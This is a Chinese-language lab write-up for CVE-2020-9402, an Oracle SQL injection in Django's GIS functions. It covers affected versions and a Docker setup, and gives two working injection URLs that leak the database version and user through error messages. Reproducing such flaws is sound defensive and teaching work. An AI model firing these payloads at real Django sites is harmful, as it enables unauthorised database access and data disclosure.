# Django GIS函数和聚合中因容差参数导致SQL注入漏洞（CVE-2020-9402）

Django是一个高级的Python Web框架，支持快速开发和简洁实用的设计。

Django在2020年3月4日发布了安全更新，修复了在GIS查询功能中存在的Oracle SQL注入漏洞。该漏洞影响Django 3.0.4、2.2.11和1.11.29之前的版本。

该漏洞需要开发者使用了GIS中的查询功能，且用户可以控制查询集中的字段名。这个漏洞可以通过Django的内置管理界面进行利用。

参考链接：

- https://www.djangoproject.com/weblog/2020/mar/04/security-releases/

## 环境搭建

执行如下命令编译并启动一个存在漏洞的Django 3.0.3服务器：

```
docker compose build
docker compose up -d
```

环境启动后，访问`http://your-ip:8000`即可看到Django默认首页。

## 漏洞复现

首先访问`http://your-ip:8000/vuln/`。通过向`q`参数添加恶意输入来注入SQL：

```
http://your-ip:8000/vuln/?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null  OR (1+1
```

SQL错误信息将会显示，证实注入成功：

![](1.png)

另外，你也可以访问`http://your-ip:8000/vuln2/`，使用不同的payload进行SQL注入：

```
http://your-ip:8000/vuln2/?q=0.05))) FROM "VULN_COLLECTION2"  where  (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null  --
```

SQL错误信息将再次确认注入成功：

![](2.png)
